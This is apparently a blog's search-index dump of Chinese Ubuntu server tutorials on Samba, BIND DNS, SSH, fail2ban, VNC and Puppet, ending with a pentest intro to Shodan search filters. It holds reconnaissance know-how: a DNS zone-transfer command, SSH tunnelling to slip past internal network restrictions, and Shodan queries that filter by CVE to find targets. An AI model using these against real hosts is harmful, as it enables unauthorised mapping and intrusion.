同步系统账号(把Linux系统的账户拷到samba的用户数据库中进行处理) 其他10多个进程 安装 sudo apt install samba libpam-winbind 配置 配置文件： /etc/samba/dhcp.conf # 指定WINS服务器（跨网段时候用） /etc/samba/smb.conf # 主配置文件 一. 配置验证用户名的Samba服务 1.配置文件/etc/samba/smb.conf workgroup = WORKGROUP # [global] 工作组：net config worktation查看工作组 [Private] # 起个名(共享文件夹的名称) comment = prvivate share # 描述 path = /srv/private/ # 共享路径 browseable = no # 是否允许访问者可显示它这个共享文件夹(完整账号) guest ok = no # 禁用来宾账号 writable=yes # 可读写(read only=yes) create mask = 0700 # 新建文件权限 vaild users=@samba # 可访问共享的用户组(稍后会创建) # 2.创建用户/组/共享文件夹 sudo adduser user1 sudo groupadd smaba # 上面配置的组的名称 sudo gpasswd -a user1 samba sudo smbpasswd -a user1 # 设置用户SMB密码(不是操作系统的密码) sudo mkdir /srv/private/ # 创建共享目录 sudo setfacl -R -m \"g:samba:rwx\" /srv/private/ # 设置acl访问控制列表，-m修改 (ll之后看到后面有个+号，表示有更多权限) getfacl /srv/private/ # 查看权限 testparm # 检测 sudo systemctl restart smbd.service nmbd.service 客户端访问 win上可以访问Linux上的Samba文件夹, Linux上也可以访问Linux上的Samba文件夹 Linux # 图形化 点击Connect to Server，输入地址： smb://192.168.0.130 # 命令行 smbclient -L //192.168.0.130 # 查看目标都有哪些共享信息 smbclient -L //192.168.0.130 -U user1 mount -t cifs -o username=user1 //192.168.0.130/private/public /mnt # 挂载 Windows # win+R \\\\192.168.0.130 # 命令行工具来访问 net user # 查看会话 net user \\\\host\\private/user1 passwd net user \\\\host\\private /delete # 删除已经建立的会话 net user g: \\\\host\\private # 映射为本地盘符 net config workstation 共享名称以$结尾的，在win上会认为隐藏共享(Linux上还是会显示) 二. 配置公开访问的Samba服务(开放共享文件件) 将不提供登录账号的用户映射为guest，无需输入密码 1.配置文件 #配置文件/etc/samba/smb.conf [Global] # 起个名(共享文件夹的名称) workgroup = WORKGROUP security = user # share已废止、Domain、ADS、Server map to guest = bad user # 映射为guest guest ok = yes # 允许来宾账号 2.开放共享文件夹 [Public] comment = public share path = /srv/public/ browseable = yes # 允许看到 writable = yes guest ok = yes 3.创建共享目录 mkdir -p /srv/public/ # 设置访问列表（设置user,nobody代表guest） sudo setfacl -R -m \"u:nobody:rwx\" /srv/public/ getfacl /srv/public/ # 查看权限 testparm # 检测 # 重启服务 sudo systemctl restart smbd.service nmbd.service 客户端访问 同上 服务器信息 smbd --version # 查看版本 sudo smbstatus # 查看状态和连接状况 ","date":"2020-04-14","objectID":"/ubuntu-server-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1/:5:0","tags":["Linux","ubuntu","文件服务"],"title":"ubuntu server-文件服务","uri":"/ubuntu-server-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"DNS服务 您是谁家老小 ","date":"2020-04-12","objectID":"/ubuntu-server-dns%E6%9C%8D%E5%8A%A1/:0:0","tags":["Linux","ubuntu","DNS"],"title":"ubuntu server-DNS服务","uri":"/ubuntu-server-dns%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"域名解析原理 DNS：将容易基于的主机名映射到IP地址 计算机命名规范： Netbiso名称（微软） Hostname DNS分布式名称系统(但是不同的dns服务器是有层级关系的，呈树状结构) DNS服务结构： 域名 比如：sina.com.cn FQDN(fully qualified domain names ) 比如:www.sina.com.cn 即主机名(www)+域名(sina.com.cn) DNS记录类型 记录类型 作用 NS 域名服务器记录(找a.com与里面的域名对应的ip的话，就要去问域名服务器,问他www的对应的主机的ip地址是多少)，一个域可以有多个域名服务器(dig a.com ns) A 主机记录(域名解析到ip地址) CNAME 别名记录(给域名指向另一个A记录的域名,可以叠加) MX 邮件交换记录 PTR 指针记录（反向查询） SOA 起始授权记录(soa记录对应的域名服务器，才是合法的) DNS命名空间 www.ubuntu.com.严格来说是有点的，但是为了方便，最后面不写点也可以 DNS查询： 逐级委派 由机构LCANN负责管理, 负责根域. ","date":"2020-04-12","objectID":"/ubuntu-server-dns%E6%9C%8D%E5%8A%A1/:1:0","tags":["Linux","ubuntu","DNS"],"title":"ubuntu server-DNS服务","uri":"/ubuntu-server-dns%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"DNS查询寻结构 三种DNS服务器： Master(DNS域里面中，master服务器可以修改DNS记录，在master上做得修改也会自动同步到其他slave等dns服务器) 一般只设置一台 Slave（数据文件来自master的同步） – 前两者两种服务器都会保存dns记录类型 Cache （不保存任何记录，一般都是运营商提供的，跟下面的dns查询有关系，意义：本个区域内有缓存了减少dns会话的流量，提高了效率，减轻了带宽占用，超出生命周期之后才会再次查询） TTL 4.Forward（转发类型的，比如会去转发给本地运营商的dns服务器(比如家用无线路由器会企业的域控)，而不是自己去进行递归查询啥的） 同时是三种角色 安装DNS服务 使用最广的DNS服务的软件包：BIND（Berkley Internet Naming Daemon） 在ubuntu上： # 安装bind(即软件包) 9是版本，dnsutils是用来检查的软件包 sudo apt install bind9 dnsutils # DNS服务区只保存和解析本域各种域名记录 # DNS服务都包含13个根域名服务器地址 cat /etc/bind/db.root # -\u003e ipv4和ipv6地址(AAAA记录) # 事实分布于世界的数百台根域服务器，不只是13个（国内是有根域服务器的） DNS服务器的DNS服务器配置 自己做迭代 指定递归域名服务器（自建尽量禁用其他地址来连接我们递归查询功能, 除非查询的是域内的域名） # 见 DNS主备部署 DNS默认服务端口 TCP 53 / UDP 53 这里是以Bind软件包为例 还有其他软件包： Djbdns 衍生版本：Dbndns, ndjbsns dhamasq DNS + DHCP打包的轻量解决方案 –\u003e 经常用于无线渗透，搭建无线AP 3.PowerDNS 模块化开源DNS服务器软件 ","date":"2020-04-12","objectID":"/ubuntu-server-dns%E6%9C%8D%E5%8A%A1/:2:0","tags":["Linux","ubuntu","DNS"],"title":"ubuntu server-DNS服务","uri":"/ubuntu-server-dns%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"DNS主备部署 对于dns服务器本身的dns地址可以执行运营商等的地址 ","date":"2020-04-12","objectID":"/ubuntu-server-dns%E6%9C%8D%E5%8A%A1/:3:0","tags":["Linux","ubuntu","DNS"],"title":"ubuntu server-DNS服务","uri":"/ubuntu-server-dns%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"正向区域 配置Master DNS服务器 执行区域文件（正向区域 –\u003e 域名解析为ip） 企业内部自用， 一般一个域中会有两个DNS服务器 # sudo vim /etc/bind/named.conf.local # zone定义一个区域， type类型，指定存具体记录的文件 zone \"lab.com\"{ type master; file \"/etc/bind/db.lab.com\" } 2.编辑区域文件 # 拷贝一个现有的区域文件模板，进行修改(也可手动创建) cp db.local db.lab.com sudo vim db.lab.com # 文件内容 ; BIND data file for lab.com loopback interface ; $TTL 604800 # 允许缓存DNS服务器的缓存时长，单位s， 1D -\u003e一天,12h -\u003e 12小时 @ IN SOA soa.lab.com. root.localhost. ( # @表示本域的域名， IN -\u003e互联网记录类型， SOA起始授权记录; root.localhost.管理员邮箱地址(点就是@ -\u003eroot.lab.com.), 括号多行内容 2 ; Serial # 版本号，如果slave的与master服务器字段值相同则不同步数据，不同则同步数据 604800 ; Refresh # slave向master的更新周期 86400 ; Retry # 重试周期 2419200 ; Expire # 最大重试时间 604800 ) ; Negative Cache TTL ; @ IN NS ns1 # NS记录，dns域的域名服务器的名称 @ IN A 10.1.8.128 # 给哪个域名创建A记录，访问本机的域名解析到哪里 @ IN AAAA ::1 # ipv6使用的 ns1 IN A 10.1.8.10 # 给域的ns记录域名解析到哪个ip soa IN A 10.1.8.10 www IN CNAME web # 把www.lab.com解析为web.com.lab web IN CNAME w3 # 有一个CNAME记录 w3 IN A 10.1.8.128 # 最终解析为A记录的ip @ IN MX 10 mx1 # 优先级，数字越小优先级越高 @ IN MX 10 mx2 mx1 IN A 10.1.8.1 # 再把mx的域名解析到ip mx2 IN A 10.1.8.2 ftp IN A 10.1.8.128 ftp IN A 10.1.8.129 # 同一个a记录命名指向不同的ip，不区分优先级，而是轮询 3.重启服务 sudo systemctl restart bind9 sudo systemctl status bind9 4.服务器配置检查 sudo named-checkconf # 检查语法错误 sudo named-checkzone lab.com /etc/bind/db.lab.com # 正向区域检查 sudo named-checkzone lab.com /etc/bind/db.lab.com # 反向区域检查 5.客户端解析验证 # dig在win上没有 ping lab.com dig lab.com ns @10.1.8.10 # 解析ns记录，@dns服务器 dig www.com @10.1.8.10 dig com a @10.1.8.100 # 不指定的话，默认就是a记录 dig lab.com mx @10.1.8.100 客户端解析验证 # nslookup在linux和win都有 nslookup # 设置参数 server 10.1.8.100 # dns服务器 set q=ns # 查询记录类型 lab.com # 查询目标 ## Windows本机hi进行dns本地缓存， 而Linux本地是不做缓存的 ipconfig /displaydns # 显示本地缓存的dns记录 ipconfig /flushdns # 清空本地缓存的dns记录 配置Cache DNS服务器 主配置文件/etc/bind/named.conf # 只是一个入口文件 include \"/etc/bind/named.conf.options\"; # 规范: 【分号结尾】 include \"/etc/bind/named.conf.local\"; # include \"/etc/bind/named.conf.default-zones\"; 全局转发DNS服务器 对于不属于我们域的解析转发给其他dns服务器 （我们内部的nds服务器不知道怎么解析之后要去找谁） 配置转发器的文件: vim /etc/bind/named.conf.options 1.全局转发： acl \"local\"{ # options 块之前 10.1.8.0/24； # 本地网段(为公司内部的地址提供服务) }； options { recursion yes; # recursion即递归查询(公网上的dns服务器一般是禁止递归查询的) allow-recursion { local; }; # 允许对我发起递归查询的地址范围 listen-on { 10.0.2.53; }; # 指定侦听的地址 forwarders { 9.9.9.9; # 全局性的转发器，转发给谁 8.8.8.8; }; }; sudo systemctl restart bind9.service 2.局部转发 zone \"sina.com.cn\" { # 创建一个域名 type forward; forwarders { 202.99.96.68; #局部转发，针对某个域名转发给某一个ip 202.106.0.20; }; }; sudo systemctl restart bind9.service 解析过之后，就有了缓存，在一定时间内就不会转发再进行请求了 ","date":"2020-04-12","objectID":"/ubuntu-server-dns%E6%9C%8D%E5%8A%A1/:3:1","tags":["Linux","ubuntu","DNS"],"title":"ubuntu server-DNS服务","uri":"/ubuntu-server-dns%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"反向区域 配置Master DNS服务器 （i反向区域: ip解析为域名 –\u003e 反垃圾邮件） 反垃圾邮件：攻击者伪造域内邮件发送恶意文件；检查外部的邮件是否是从真正的邮件服务器发送过来的 1. # sudo vim /etc/bind/named.conf.local # zone定义一个区域， type类型，指定存具体记录的文件 zone \"8.1.10.in-addr-arpa\"{ # 反着写,这里一个网段的地址10.1.8就写为8.1.10 type master; file \"/etc/bind/db.10.1.8\"; } # 拷贝一个模板文件 sudo cp /etc/bind/db.127 /etc/bind/db.10.1.8 # 重启服务 sudo systemctl restart bind9 sudo systemctl status bind9 # 编辑反向区域配置文件 vim /etc/bind/db.10.1.8 # 文件内容 ; ; BIND reverse data file for local loopback interface ; $TTL 604800 @ IN SOA ns.lab.com. root.lab.com. ( 1 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL ; @ IN NS ns.lab.com. # 本地的ns记录 10 IN PTR ns.lab.com. # PTR 反向指针记录 145 IN PTR mx1.lab.com #145即10.1.8.145 2 IN PTR mx2.lab.com 2 IN PTR w3.lab.com # 一个ip也可以解析为多个域名 4.检测一下反向解析是否正常 dig -x 10.1.8.2@10.1.8.2 配置Slave DNS服务器 为例实现冗余容错(防止某台dns服务器宕机)，通常会为每个与安装多个Slave DNS服务器 修改记录只能在Master DNS服务器(一个域内只允许有一个)上操作，通过版本号(Serial)通知Slave服务器同步 (所以。作为master的管理员，配置更新之后需要手动修改版本号的值) 安全考虑 服务器全局禁止区域传输（同步本域所有DNS记录） 只允许指定IP，指定区域的Slave服务器进行区域传输 区域数据同步使用TCP 53端口 # dig进行区域传输获取信息 axfr(黑客最喜欢拿的) dig @10.1.8.10 lab.com axfr ## 禁止区域传输： # 全局配置文件 # sudo vim named.conf.options # 在option中添加： allow-transfer { none; }; # 重启 # 禁用之后，不影响dig来查询某记录，只是拒绝一次性把记录拿走 2.继续修改master服务器配置 # sudo vim /etc/bind/named.conf.local # 在正向/反向zone字段里面都要添加 allow-transfer { 10.0.2.54; }; # 允许10.0.2.54 -\u003e 就是slave服务器 3.继续修改master服务器配置 # vim /etc/bind/db.lab.com # 增加一条NS记录和A记录 @ IN NS ns2 ns2 IN A 10.1.8.20 # 编辑反向的域名解析记录 # vim db.10.1.8 20 IN PTR ns2.lab.com. # 重启服务 4.安装slave dns服务器并配置 sudo vim /etc/bind/named.conf.options # 内容 acl \"local\"{ # 10.1.8.0/24； }； options { recursion yes; allow-recursion { local; }; listen-on { 10.0.8.20; }; # 侦听自己的 allow-transfer { none; }; forwarders { 9.9.9.9; 8.8.8.8; }; ............ }; # 重启服务 5.slave dns服务器上创建区域 # sudo vim /etc/bind/named.conf.local # 正向zone区域（和master上的对应好） zone \"lab.com\"{ type slave; file \"db.lab.com\"; # 不能使用绝对路径(区域文件不用手动创建) masters { 10.1.8.10; }; } # 反向区域 zone \"8.1.10.in-addr.arpa\"{ type slave; file \"db.lab.com\"; # 不能使用绝对路径 masters { 10.1.8.10; }; } # 重启服务 #区域文件db.lab.com不用手动创建 # 会自动从master上同步下来 # 位置在 /var/cache/bind/ 而且文件是加了密的 # 查看slave dns服务器的情况 grep bind /var/log/syslog 记录更新通知 Slave服务器到达更新周期 客户端数据加密保存（不能直接修改） Master服务器通知版本号 master服务器的dns配置更新之后，一定要手动修改版本号，然后重启 在区域配置文件配置（master服务器的dns配置更新之后会通知slave服务器）： # sudo vim /etc/bind/named.conf.local # 正反向zone都要配置 also-notify { 10.1.8.20; }; ","date":"2020-04-12","objectID":"/ubuntu-server-dns%E6%9C%8D%E5%8A%A1/:3:2","tags":["Linux","ubuntu","DNS"],"title":"ubuntu server-DNS服务","uri":"/ubuntu-server-dns%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"第七章-远程管理 看我遥控你 ","date":"2020-03-31","objectID":"/ubuntu-server-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/:0:0","tags":["Linux","Ubuntu","远程管理"],"title":"ubuntu server-远程管理","uri":"/ubuntu-server-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"categories":["Linux"],"content":"远程访问方式 为什么要远程管理？ 服务器大多部署与专门的机房： 电磁、噪声、氧气、温度湿度等都不适宜人类长期居住 避免闲杂人等结束业务服务器 远程管理 不同的操作系统都支持远程管理技术 命令行远程管理工具 图形化远程管理工具 Telnet 账号证明就是你 古老的命令行远程管理工具（保底的，建议能不用就不用） 不安全（明文） 应尽量避免适用（适用于不支持ssh的环境） 客户端程序包含在所有系统的默认安装中 服务端口默认TCP 23 客户端 #可以连接任何域名和端口 telnet 1.1.1.1 80 #和80端口建立socket连接后，可以发送http数据 服务器端程序安装 sudo apt install telnetd vim /etc/issus.net # 避免泄露版本信息, #打开文件，修改tenlet的banner信息（可以修改为一些告知的警告信息:\"本公司的服务器,出问题承担法律责任\"哈哈） # 查看服务状态 systemctl status inetd.service SSH 账号证明就是你 服务器安装 # ubuntu中ssh-server和ssh-client都默认安装了 sudo apt install openssh-server # openssh是个工具套件(包含了sftp,scp等) # sftp(替代了sftp) \u003c---\u003e ftp(明文传输,不太安全) # scp(替代了rcp) \u003c---\u003e rcp(远程拷贝文件,明文传输,不太安全) #查看服务状态 systemctl status sshd.service # 服务端口默认`22` # 配置文件(ubuntu上来就可以直接使用不用配置) vim /etc/ssh/sshd_config #修改配置在这个文件 SSH1、SSH2两个版本(版本2更安全) 配置文件 vim /etc/ssh/sshd_config 常用配置项： Banner /etc/ssh_banner.sh # 登录前的banner,指定文件 Port 2222 # 修改默认端口(修改后，下次连接会改变端口) PubkeyAuthentication yes # 开启后使用公钥登录/关闭(no) ListenAddress 12.34.56.78 # 指定哪块网卡才能侦听22(被ssh连接) PermitRootLogin yes # 是否允许root远程登录(不过还是建议使用普通账号),建议设置为no是禁止所有方式登录 #prohibit-password是禁用账号密码方式 Protocol 2 # 默认是2.0的协议，可以加一下这条配置，指定只接受2.0版本的连接 Allowsers user1 user2 # DenyUsers user3 允许/禁止ssh连接的用户 AllowGroup sshusers # 允许/禁止ssh连接的用户`组` PasswordAuthentication no # 禁止使用密码登录(单一密码认证的安全性很低) # 更多配置查文档 一些零散问题 — SSH工具 1.scp #默认连接22端口，如果修改了就需要指定端口号 scp a.txt 192.168.1.10: # 拷贝一个文件(默认本地账号与原创系统账号同名，默认目标是主目录) 注意冒号 scp a.txt user1@192.168.1.10:/home/b.txt # 指定用户名、目标路径 scp -rv dirs/ user1@192.168.1.10: # 拷贝一个目录， -r递归,-v详细信息 scp user1@192.168.1.10:/tmp/b.txt . # 拷贝目标服务器的文件到我的机器当前目录上(下载) 2.SFTP（ssh和ftp的组合） # 登录 sftp xps@192.168.1.10 # 下载文件 get a.txt # 上传 put # 一些命令：help, ls, cd, get, wget, put, mput # 退出 quit exit ssh公钥登录 非对称算法（公钥算法） 公钥 私钥 公钥加密，私钥解密；私钥加密，公钥解密 生成秘钥对 # 1.在我的机器(客户端)产生一对， 选择rsa算法，秘钥长度选择4096 ssh-keygen -t rsa -b 4096 # 修改... # 命名秘钥对 ssh-keygen -t rsa -b 4096 -f id_mail # 修改私钥密码文(这个密码要设置更加安全一点) -p， -f指定修改哪个key的 ssh-keygen -p -f ~/.ssh/id_rsa # 有多个的话，-f指定 # 2.设置公私钥保存的位置，和打开的密码 # 存放在下面两个文件 ~/.ssh/id_rsa # 私钥 ~/.ssh/id_rsa.pub # 公钥 #ps：know_hosts是连接过的主机 # 3.把公钥文件--\u003e传送到目标服务器上(服务器上会变成.ssh/authorized_key) ssh-copy-id xps@192.168.0.10 #如果有多个，-i选择公钥 # 4. 建议设本地私钥文件权限 chmod 400 .ssh/id_rsa # 5.服务端公钥权限也要修改 .ssh/authorized_key # 6.现在可放心登录了(现在输入的密码是对私钥加密的密码) ssh xps@192.168.0.10 # Note：记得配置文件修改为禁止使用ssh密码登录,使用公钥登录： PasswordAuthentication no PubkeyAuthentication yes # Note:私钥千万不能泄露哦 ","date":"2020-03-31","objectID":"/ubuntu-server-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/:1:0","tags":["Linux","Ubuntu","远程管理"],"title":"ubuntu server-远程管理","uri":"/ubuntu-server-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"categories":["Linux"],"content":"SSH隧道 通过ssh隧道，封装一些其他的服务数据，保证安全性 登录 ssh xps@192.168.0.10 # 登录之后，不进入shell界面（只是获得会话后运行一个命令，但效果是一样的） -- 命令服务端去ping另外一台机器 # -i指定私钥，-p指定端口 ssh -i ~/.ssh/id_main ssh xps@192.168.0.10 -p 2222 ping 192.168.0.1 # (cstream -t限制传输速度通信带宽)拷贝文件夹到目标机器（本地打包, 在服务端解包），pv显示带宽占用情况 # --- 企业用的网络带宽(质量好)比家用的成本很贵 tar -cj dir/ | pv |cstream -t 100k | ssh xps@192.168.0.10 'tar -xj' ssh隧道 – 实现远程映射 ###### 端口映射（两个机器之间，添加一个加密的管道 来连接） # 映射远程端口23到本机2001端口 #（-f端口转发,-N不占用命令行窗口, -L侦听本机的端口，localhost理解为隧道，23为目标机器端口，最后是目标机器ip） ssh -fN -L2001:localhost:23 xps@192.168.0.10 # 现在，telnet本机的2001端口，就相当于通过机密的隧道来映射到目标的23端口 # 其他类型的服务也可以封装... ### 拓展：远程映射 # 隧道的起点：我的机器，隧道的终点：'另外机器'。然后通过'另外机器',访问目标机器(sina) # 本机的2002端口，通过ssh隧道，映射到'另外机器'(世界上随便一个机器)的ip的80端口， # 用途：内网特殊的服务器运行访问外网(进行映射)，就能突破对内容不能上网的限制 # 限制：一对一，针对的外网的某一台（提高：一个端口访问外网所有资源，自己找资料） ssh -fN -L2002:123.206.96.26:80 xps@192.168.0.10 # 再telnet 127.0.0.1:2002,就是达到了访问123.206.96.26的80端口的目的(最后的ip只是建立隧道,类似中间的一个) ssh隧道 – 实现文件系统挂载 比如，一开机，就自动把远程机器的目录/分区挂载到我本机上，跟访问本地目录一样的效果 ## ssh隧道实现文件系统的挂载 # 第一个ip的要挂载的远程机器，后面的本机目录 sshfs xps@192.168.0.10:home/test /mnt/myfiles # 远程挂载远程机器目录到本地 # 再查看，会发现本地目录多了远程服务器目录的文件（如果网络带宽不够，性能和体验就比较差） # 在客户端/服务端对文件进行操作，都是可以的 umount /mnt/myfiles # 卸载1 fusermount -u /mnt/myfiles # 卸载2 #配置文件使用持久化挂载 vim /etc/fstab user1@192.168.0.10:/path /mntpotin fuse,sshfs, rw,noauto,user,_netdev0 # 目标机器的路径，本机的挂载点 SSH客户端 若要管理的服务器的数目众多，对每台服务器做一个方便记忆的标签，简化登录 在本机(客户端)创建一个客户端配置文件：~/.ssh/config 内容 host server1 # 别名随意 Hostname 192.168.1.10 # 对应主机ip，端口，用户名 Port 22 User xps host db2 Hostname 192.168.1.10 Port 22 User xps host mail1 Hostname 192.168.1.10 Port 22 User xps 以后登录的话，直接： # 直接登录别名即可(不仅方便，还隐藏了ip，更加安全) ssh db1 ","date":"2020-03-31","objectID":"/ubuntu-server-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/:2:0","tags":["Linux","Ubuntu","远程管理"],"title":"ubuntu server-远程管理","uri":"/ubuntu-server-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"categories":["Linux"],"content":"SSH安全 SSH防爆破 密码爆破防护 方法：监视：次数太多就禁止该ip访问 借助fail2ban来实现: fail2ban原理：周期性的检查登录日志，对异常的ip进行屏蔽(调用防火墙实现) # 安装 apt install fail2ban # 默认主配置文件，软件更新时被覆盖(`所以一般不会使用它`) jail --\u003e 监狱 /etc/fail2ban/jail.conf # 本地配置文件，软件更新不被覆盖，优先级更高（`一般常修改这个文件`） 复制一份：cp jail.conf jail.local /etc/fail2ban/jail.local #配置项(一般只需配置几项) #1.全局的： ignoreip=127.0.0.1/8 19.168.0.10 # 忽略并不进行监视的地址（受信的ip地址段） bantime=-1 # 禁用的时间(单位是s)， -1是永远屏蔽 findtime=1 # 查询间隔时间 maxretry=5 # 连着失败输入多少次密码，我就屏蔽你 #2.Actions: 有异常做什么动作(比如报警邮件，默认是防火墙屏蔽) #3.Jails设置：针对不同类型的服务(并不仅限于ssh服务)，配置不同的（这里的优先级比全局配置项高） [sshd] ecabled=true # 启用对ssh的jails filter=sshd # 查找的关键词 logpath = xxxxxx.log # 以ssh服务为例(见下图) # 重启服务生效 sudo systemctl restart fail2ban.service # 查看身份认证日志文件 tail -f /var/log/auth.log # 查看jail列表(都有哪些jail，jail的情况) sudo fail2ban -client status sudo fail2ban -client status sshd # 查看ssh的jail的详细信息 # 查看防火墙规则 sudo iptables -S sudo iptables -L -n # 手动解除被禁IP sudo iptables -D f2b-sshd-s 192.168.1.111 -j REJECT # 通过删除防火墙某一个规则 -D, REJECT或DROP看自己的情况 sudo fail2ban-client set sshd unbanip 192.168.1.8 # 手动解除禁用之后，但是如果重启服务，会再自动查看日志：还没有超过被禁期限的ip会再次被禁 ","date":"2020-03-31","objectID":"/ubuntu-server-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/:3:0","tags":["Linux","Ubuntu","远程管理"],"title":"ubuntu server-远程管理","uri":"/ubuntu-server-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"categories":["Linux"],"content":"VNC服务 这里只介绍vnc，还有其他更优秀的工具，但是vnc的适用范围最广 图形化界面（类似于windows下的远程桌面） 使用图形化界面及工具 是Linux系统最通用的远程图形管理工具（通用适用于windows） 安装图形环境 #这里安装简化版的xfce4桌面环境，这里选择vnc的一个软件包:tightvncserver. 也可以自己选择别的版本的 sudo apt install gnome-core xfce4 xfce4-goodies tightvncserver # 一个vnc可以启动多个侦听端口(默认从5901开始)，从不同端口连接，打开不同会话(每个用户看到的桌面是不一样的) # 若只侦听一个端口，通过一个端口连接，多个用户看到的都是一个桌面 # 建议：多用户，在每一个不同权限的用户下(su进去，运行启动实例)，这样不同用户连接就是不同的桌面了 运行配置 vncserver # 启动vnc服务（接下来会让你输入连接密码和只读密码） ~/.vnc/xstartup # 会生成运行文件 vncserver -kill:1 # 删掉自动生成的实例（因为不一定最适合我们的桌面环境。冒号后面是1是5901,如果是2就是5902） # 备份一下文件 mv xstartup xstartup.bak # 创建新运行文件， 手动配置适合我们xfce4的vnc配置 vim xstartup #!/bin/bash xrdb $HOME/.Xresources startxfce4 \u0026 # 修改权限 chmod +x ~/.vnc/xstartup # 重新运行 vncserver # tcp的5901端口 # 就可以在客户端用客户端软件连接了(比如：Remote Desktop Viewer) 输入ip:端口 # Note: 服务器上，能少开端口就少开端口，能少开服务就少开服务 多用户 # 每个用户不用会话 # 在每一个不同权限的用户下(su进去，运行启动实例)，这样不同用户连接就是不同的桌面了 su newuser1 vncserver ~/.vnc/xstartup vncserver -kill:2 vim xstartup #!/bin/bash xrdb $HOME/.Xresources startxfce4 \u0026 chmod +x ~/.vnc/xstartup vncserver :2 # tcp的5902端口 ps: vnc的加密强度不是很高，所以：在不需要vnc的时候，建议杀掉vnc进程(vncserver -kill:2) 因为 vnc的加密强度没有ssh高，所以，尝试：先建立ssh隧道，再在隧道的基础上建立图形化的连接 ","date":"2020-03-31","objectID":"/ubuntu-server-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/:4:0","tags":["Linux","Ubuntu","远程管理"],"title":"ubuntu server-远程管理","uri":"/ubuntu-server-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"categories":["Linux"],"content":"PUPPET 也是一个远程管理工具，可以不登录到被管理服务器上 利用puppet的服务端(我的机器)来管理puppet的客户端(安装在远程服务器上)，进行批量管理… 全生命周期的远程管理方案 软件安装部署(可以写一个脚本，然后批量下发给安装有puppet客户端的服务器上) 权限设置 账号管理 支持云平台 支持容器(Docker) 适合大量服务器管理 准备 # 这里以两台机器做实验 # 为了区分，改一下两台计算机名 hostnamectrl set-hostname puppet hostnamectrl set-hostname client # 修改hosts文件，修改解析域名(这个随便起) -- 两台机器都要修改 vim /etv/hosts 192.168.1.10 puppet.lab.com puppet 192.168.1.11 client.lab.com client # 其他行都删掉就行 # 可以在dns服务器上修改，这里通过hosts修改域名解析只是权宜之计(下一章学完DNS之后就在dns服务器修改域名的解析) 安装 # 安装puppet服务端程序 sudo apt install puppetmaster # 安装puppet客户端程序 sudo apt install puppet 配置 服务端配置-1 cd /etc/puppet sudo mkdir -p modules/apache2/manifests # manifests 目录下面就是资源文件 touch init.pp # sudo vim /etc/puppet/modules/apache2/manifests/init.pp # 比如要给下面的机器安装apache, # 一组资源就是一个类 class apache2{ package{'apache2': # 软件包 ensure=\u003einstalleds, } service{'apache2': # apache的服务是否启动 ensure=\u003eture, ensure=\u003eture, require=\u003ePackage['apache2'], # 包的名称 } } 服务端配置-2 # 上面的配置文件定义了资源，那么这里确定要给哪些服务器安装哪个资源 # 选择哪个资源 cd manifests touch site.pp # sudo vim /etc/puppet/manifests/site.pp # 解析这个节点(通过域名解析到对应ip,只要那些计算机在这个域名即可) node 'client.lab.com' { include apache2 # 选择下发哪些资源。这里以推送apache2资源为例 } # 重启服务 systemctl restart puppetmaster.service 客户端配置 # puppet的客户端和服务端是通过证书来通信等操作的 # sudo vim /etc/default/puppet 默认没有，自己新建 START=yes # 重启服务（会自动向puppet服务端发起请求申请证书） systemctl restart puppet.service 客户端证书前面请求测试 # 在查看客户端的指纹信息 sudo puppet agent --figerprint # 服务端下面下发证书后，然后在客户端测试一下，获取证书 sudo puppet agent --test 服务端请求查看签名 # 在服务端查看哪些客户端跟我发起证书请求了 sudo puppet cert list # 在服务端使用自己的私钥给对应的机器进行签名(sign) sudo puppet cert sign client.lab.com # 客户端查看证书下发进度： sudo puppet agent --test 完成上面的步骤(资源的下发配置，证书的请求与签名下发，重启服务)之后，在客户端查看apache2的服务已经安装好并启用了 日志状态信息查看 # 查看状态 systemctl status puppet.service /var/log/syslog 上面关于puppet只是简单的一小部分，后续高级用法，请自行探索 ","date":"2020-03-31","objectID":"/ubuntu-server-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/:5:0","tags":["Linux","Ubuntu","远程管理"],"title":"ubuntu server-远程管理","uri":"/ubuntu-server-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"categories":["渗透测试"],"content":"一. shodan 1.简单介绍 Shodan，是一个暗黑系的谷歌，作为一个针对网络设备的搜索引擎，它可以在极短的时间内在全球设备中搜索到你想找的设备信息。对于渗透工作者来说，就是一个辅助我们寻找靶机的好助手。 2.内置语法 # Shodan的参数有很多，这里只介绍简单的几种 hostname：\"主机或域名\" 如 hostname:\"google'' port：\"端口或服务\" 如 port:\"21\" ip : \"ip地址\" 如 ip : \"168.205.71.64\" net：\"IP地址或子网\" 如 net:\"210.45.240.0/24\" vuln :指定漏洞的cve 如 vuln:CVE-2015-8869 但是这个命令最好搭配起来使用，如 country:CN vuln:CVE-2014-0160 os :\"操作系统\" ​ 如 os:\"centOS\" isp：\"ISP供应商\" 如 isp:\"China Telecom\" product：\"操作系统/软件/平台\" 如 product:\"Apache httpd\" version：\"软件版本\" 如 version:\"3.1.6\" geo：\"经纬度\" 如 geo:\"39.8779,116.4550\" country`：\"国家\" 如 country:\"China\" country:\"UN\" city：\"城市\" 如 city:\"Hefei\" org：\"组织或公司\" 如 org:\"google\" before/after：\"日/月/年\" 如 before:\"25/09/2017\" after:\"25/09/2017\" asn : \"自治系统号码\" 如 asn:\"AS2233\" 